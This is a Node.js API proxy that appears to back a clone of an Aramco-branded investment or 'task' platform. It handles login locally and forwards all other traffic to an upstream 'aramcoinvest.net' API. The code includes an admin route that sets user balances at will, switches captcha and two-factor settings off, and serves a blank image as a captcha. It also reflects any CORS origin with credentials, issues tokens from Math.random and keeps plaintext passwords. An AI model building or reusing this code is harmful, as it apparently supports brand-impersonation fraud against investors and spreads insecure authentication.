/**
 * API proxy for the bundled SPA.
 *
 * Strategy:
 *   1. Auth endpoints (register, login) use our own Postgres-backed user system.
 *   2. All other endpoints are proxied to the upstream API (api.aramcoinvest.net)
 *      so that real data (products, images, tasks, etc.) flows through.
 *   3. Upload/image requests are also proxied so images load correctly.
 *
 * Env:
 *   POSTGRES_URL       — auto-set when you add Vercel Postgres
 *   STUB_ADMIN_SECRET  — POST /api/admin/balance with header x-admin-secret
 *   UPSTREAM_API       — upstream API base (default: https://api.aramcoinvest.net)
 */

const https = require("https");
const http = require("http");
const bcrypt = require("bcryptjs");
const db = require("../lib/db");

const UPSTREAM = (process.env.UPSTREAM_API || "https://api.aramcoinvest.net").replace(/\/+$/, "");

function applyCors(req, res) {
  const origin =
    process.env.ALLOW_ORIGIN ||
    req.headers.origin ||
    "https://aramco.company";
  res.setHeader("Access-Control-Allow-Origin", origin);
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Content-Type, Authorization, st-lang, st-ctime, st-ttgn, Accept"
  );
}

/** Memory fallback */
const usersByEmail = new Map();
const tokenToEmail = new Map();

function json(req, res, statusCode, body) {
  applyCors(req, res);
  res.setHeader("Content-Type", "application/json; charset=utf-8");
  res.statusCode = statusCode;
  res.end(JSON.stringify(body));
}

function ok(data) {
  return { status: 200, msg: "ok", data };
}

function err(msg, code = 400) {
  return { status: code, msg: String(msg), data: null };
}

function parseBody(req) {
  return new Promise((resolve, reject) => {
    let raw = "";
    req.on("data", (c) => (raw += c));
    req.on("end", () => {
      if (!raw) return resolve({});
      try {
        resolve(JSON.parse(raw));
      } catch (e) {
        reject(e);
      }
    });
    req.on("error", reject);
  });
}

function collectRawBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => resolve(Buffer.concat(chunks)));
    req.on("error", reject);
  });
}

function getToken(req) {
  const h = req.headers.authorization || "";
  const m = /^Bearer\s+(.+)$/i.exec(h);
  return m ? m[1].trim() : null;
}

async function sessionEmail(req) {
  const t = getToken(req);
  if (!t) return null;
  if (db.usePostgres()) {
    return db.findEmailByToken(t);
  }
  return tokenToEmail.get(t) || null;
}

function memEnsureUser(email) {
  if (!usersByEmail.has(email)) {
    usersByEmail.set(email, {
      email,
      password: "",
      password_hash: "",
      account: email.split("@")[0] || "user",
      balance: "10.00",
      base_money: "10.00",
      available_money: "10.00",
    });
  }
  return usersByEmail.get(email);
}

async function loadUser(email) {
  if (db.usePostgres()) {
    const u = await db.findUserByEmail(email);
    if (!u) return null;
    return u;
  }
  return memEnsureUser(email);
}

function userRow(u) {
  return {
    account: u.account,
    email: u.email,
    base_money: u.base_money,
    available_money: u.available_money,
    balance: u.balance,
    phone: "",
    invitation_code: "DEMO",
    is_pwd: 1,
    head_img: "",
    level: 1,
    vip_level: 0,
    credit_score: 100,
    team_count: 0,
  };
}

async function issueToken(email) {
  const token = "tk_" + Math.random().toString(36).slice(2) + Date.now().toString(36);
  const exp = Math.floor(Date.now() / 1000) + 86400 * 7;
  if (db.usePostgres()) {
    await db.saveSession(token, email, exp);
  } else {
    tokenToEmail.set(token, email);
  }
  return { token, expires_time: exp };
}

/**
 * Proxy a request to the upstream API server.
 * Forwards the original method, headers (minus host), and body.
 * Streams the upstream response back to the client.
 */
function proxyToUpstream(req, res, route, rawBody) {
  return new Promise((resolve, reject) => {
    const url = new URL(UPSTREAM + "/api" + route);

    // Preserve query string from original request
    const origUrl = req.url || "";
    const qIdx = origUrl.indexOf("?");
    if (qIdx !== -1) {
      const origParams = new URLSearchParams(origUrl.slice(qIdx + 1));
      // Remove internal 'path' param used by Vercel routing
      origParams.delete("path");
      for (const [k, v] of origParams) {
        url.searchParams.append(k, v);
      }
    }

    const headers = {};
    // Forward select headers
    const forwardHeaders = [
      "content-type",
      "authorization",
      "accept",
      "accept-language",
      "st-lang",
      "st-ctime",
      "st-ttgn",
    ];
    for (const h of forwardHeaders) {
      if (req.headers[h]) headers[h] = req.headers[h];
    }

    const mod = url.protocol === "https:" ? https : http;
    const proxyReq = mod.request(
      url,
      {
        method: req.method,
        headers,
        timeout: 15000,
      },
      (proxyRes) => {
        applyCors(req, res);
        // Forward content-type and other response headers
        const ct = proxyRes.headers["content-type"];
        if (ct) res.setHeader("Content-Type", ct);
        res.statusCode = proxyRes.statusCode || 200;
        proxyRes.pipe(res);
        proxyRes.on("end", resolve);
        proxyRes.on("error", (e) => {
          if (!res.headersSent) {
            json(req, res, 502, err("upstream stream error: " + e.message, 502));
          } else {
            res.destroy();
          }
          resolve();
        });
      }
    );

    proxyReq.on("error", (e) => {
      json(req, res, 502, err("upstream error: " + e.message, 502));
      resolve();
    });

    proxyReq.on("timeout", () => {
      proxyReq.destroy();
      json(req, res, 504, err("upstream timeout", 504));
      resolve();
    });

    if (rawBody && rawBody.length > 0) {
      proxyReq.setHeader("Content-Length", rawBody.length);
      proxyReq.write(rawBody);
    }
    proxyReq.end();
  });
}

/**
 * Proxy upload/image requests to upstream.
 * Handles paths like /upload/img/xxx.webp, /upload/files/xxx.jpg
 */
function proxyUpload(req, res, uploadPath) {
  return new Promise((resolve, reject) => {
    const url = new URL(UPSTREAM + "/" + uploadPath);
    const mod = url.protocol === "https:" ? https : http;

    const proxyReq = mod.request(
      url,
      { method: "GET", timeout: 15000 },
      (proxyRes) => {
        applyCors(req, res);
        const ct = proxyRes.headers["content-type"];
        if (ct) res.setHeader("Content-Type", ct);
        const cl = proxyRes.headers["content-length"];
        if (cl) res.setHeader("Content-Length", cl);
        const cc = proxyRes.headers["cache-control"];
        res.setHeader("Cache-Control", cc || "public, max-age=86400, immutable");
        res.statusCode = proxyRes.statusCode || 200;
        proxyRes.pipe(res);
        proxyRes.on("end", resolve);
        proxyRes.on("error", (e) => {
          if (!res.headersSent) {
            res.statusCode = 502;
            res.end("upstream stream error");
          } else {
            res.destroy();
          }
          resolve();
        });
      }
    );

    proxyReq.on("error", (e) => {
      res.statusCode = 502;
      res.end("upstream error");
      resolve();
    });

    proxyReq.on("timeout", () => {
      proxyReq.destroy();
      res.statusCode = 504;
      res.end("upstream timeout");
      resolve();
    });

    proxyReq.end();
  });
}

module.exports = async (req, res) => {
  if (req.method === "OPTIONS") {
    applyCors(req, res);
    res.statusCode = 204;
    return res.end();
  }

  let parts = req.query.path;
  if (!parts) parts = [];
  if (typeof parts === "string") parts = parts.includes("/") ? parts.split("/").filter(Boolean) : [parts];
  if (!Array.isArray(parts)) parts = [parts];
  const route = "/" + parts.join("/");

  // Collect raw body early so we can forward it if proxying
  const rawBody = req.method !== "GET" && req.method !== "HEAD"
    ? await collectRawBody(req)
    : null;

  // Helper to parse JSON from raw body
  function parsedBody() {
    if (!rawBody || rawBody.length === 0) return {};
    try { return JSON.parse(rawBody.toString()); } catch (e) { return {}; }
  }

  try {
    if (db.usePostgres()) {
      await db.ensureSchema();
    }

    // --- Upload/image proxy (paths like upload/img/..., upload/files/...) ---
    if (route.startsWith("/upload/")) {
      return proxyUpload(req, res, route.slice(1));
    }

    // --- Admin endpoints (local only) ---
    if (route === "/admin/balance" && req.method === "POST") {
      const secret = process.env.STUB_ADMIN_SECRET;
      if (!secret || req.headers["x-admin-secret"] !== secret) {
        return json(req, res, 403, err("Forbidden", 403));
      }
      const b = parsedBody();
      const email = String(b.email || "").toLowerCase();
      const amount = String(b.balance != null ? b.balance : "0");
      if (!email) return json(req, res, 400, err("email required"));
      if (db.usePostgres()) {
        const u = await db.updateBalanceByEmail(email, amount);
        if (!u) return json(req, res, 404, err("user not found", 404));
        return json(req, res, 200, ok({ updated: true, email, balance: amount }));
      }
      const u = memEnsureUser(email);
      u.balance = amount;
      u.base_money = amount;
      u.available_money = amount;
      return json(req, res, 200, ok({ updated: true, email, balance: amount }));
    }

    // --- Auth endpoints (local user system) ---
    if (route.startsWith("/user/register") && req.method === "POST") {
      const b = parsedBody();
      const email = String(b.email || b.account || "").toLowerCase();
      const password = String(b.password || "demo123");
      if (!email) return json(req, res, 200, err("email required", 400003));
      const account = email.split("@")[0] || "user";
      const hash = await bcrypt.hash(password, 10);

      if (db.usePostgres()) {
        const exists = await db.emailExists(email);
        if (exists) return json(req, res, 200, err("exists", 400003));
        await db.createUser({ email, passwordHash: hash, account });
        const u = await db.findUserByEmail(email);
        const { token, expires_time } = await issueToken(email);
        return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
      }

      if (usersByEmail.has(email)) return json(req, res, 200, err("exists", 400003));
      const u = {
        email,
        password,
        password_hash: "",
        account,
        balance: "10.00",
        base_money: "10.00",
        available_money: "10.00",
      };
      usersByEmail.set(email, u);
      const { token, expires_time } = await issueToken(email);
      return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
    }

    if (route.startsWith("/user/login") && !route.includes("login_info") && !route.includes("login_verify") && req.method === "POST") {
      const b = parsedBody();
      const email = String(b.email || b.account || "").toLowerCase();
      const password = String(b.password || "");
      if (!email) return json(req, res, 200, err("invalid", 401));

      if (db.usePostgres()) {
        const u = await db.findUserByEmail(email);
        if (!u) return json(req, res, 200, err("invalid", 401));
        const okPass = await bcrypt.compare(password, u.password_hash);
        if (!okPass) return json(req, res, 200, err("invalid", 401));
        const { token, expires_time } = await issueToken(email);
        return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
      }

      const u = memEnsureUser(email);
      if (u.password && u.password !== password) return json(req, res, 200, err("invalid", 401));
      if (!u.password) u.password = password || "demo123";
      const { token, expires_time } = await issueToken(email);
      return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
    }

    if (route === "/user/tg" && req.method === "POST") {
      const email = "tg@demo.local";
      if (db.usePostgres()) {
        if (!(await db.emailExists(email))) {
          const hash = await bcrypt.hash("tg-demo", 10);
          await db.createUser({ email, passwordHash: hash, account: "tg" });
        }
        const u = await db.findUserByEmail(email);
        const { token, expires_time } = await issueToken(email);
        return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
      }
      const u = memEnsureUser(email);
      const { token, expires_time } = await issueToken(email);
      return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
    }

    // --- App/login config (local, not proxied) ---
    // These must be handled locally so captcha/registration settings
    // stay compatible with our own auth system.
    if ((route === "/user/login_info" && req.method === "POST") ||
        (route === "/user/app_info" && req.method === "GET")) {
      // Fetch upstream config and override auth-related fields
      return new Promise((resolve) => {
        const url = new URL(UPSTREAM + "/api" + route);
        const mod = url.protocol === "https:" ? https : http;
        const proxyReq = mod.request(url, { method: "GET", timeout: 8000 }, (proxyRes) => {
          let body = "";
          proxyRes.on("data", (c) => (body += c));
          proxyRes.on("end", () => {
            try {
              const upstream = JSON.parse(body);
              const d = upstream.data || {};
              // Override registration/captcha settings for our local auth
              if (d.register_info) {
                d.register_info.register_is_captcha = "false";
                d.register_info.invitation_code_require = "false";
              }
              if (d.setting) {
                d.setting.register_is_captcha = "false";
                d.setting.google_secret_status = "false";
              }
              json(req, res, 200, upstream);
            } catch (e) {
              // Fallback: return minimal local config
              json(req, res, 200, ok({
                register_info: {
                  register_is_captcha: "false",
                  invitation_code_require: "false",
                  is_repeat_password: "true",
                  register_account_status: "true",
                },
                setting: {
                  register_is_captcha: "false",
                  index_is_login: "false",
                  pwa_app_name: "Aramco",
                },
                theme: 1,
              }));
            }
            resolve();
          });
          proxyRes.on("error", () => {
            json(req, res, 200, ok({ register_info: { register_is_captcha: "false" }, setting: {}, theme: 1 }));
            resolve();
          });
        });
        proxyReq.on("error", () => {
          json(req, res, 200, ok({ register_info: { register_is_captcha: "false" }, setting: {}, theme: 1 }));
          resolve();
        });
        proxyReq.on("timeout", () => {
          proxyReq.destroy();
          json(req, res, 200, ok({ register_info: { register_is_captcha: "false" }, setting: {}, theme: 1 }));
          resolve();
        });
        proxyReq.end();
      });
    }

    if (route === "/user/login_verify" && req.method === "GET") {
      applyCors(req, res);
      res.setHeader("Content-Type", "image/png");
      res.statusCode = 200;
      const png = Buffer.from(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
        "base64"
      );
      return res.end(png);
    }

    // --- User info endpoints (local user data) ---
    const email = await sessionEmail(req);
    if ((route === "/user/user_info" || route === "/user/mine") && req.method === "GET") {
      if (!email) return json(req, res, 200, err("unauthorized", 401));
      const u = await loadUser(email);
      if (!u) return json(req, res, 200, err("unauthorized", 401));
      return json(req, res, 200, ok(userRow(u)));
    }

    // --- Everything else: proxy to upstream ---
    return proxyToUpstream(req, res, route, rawBody);

  } catch (e) {
    return json(req, res, 500, err(e.message || "error", 500));
  }
};
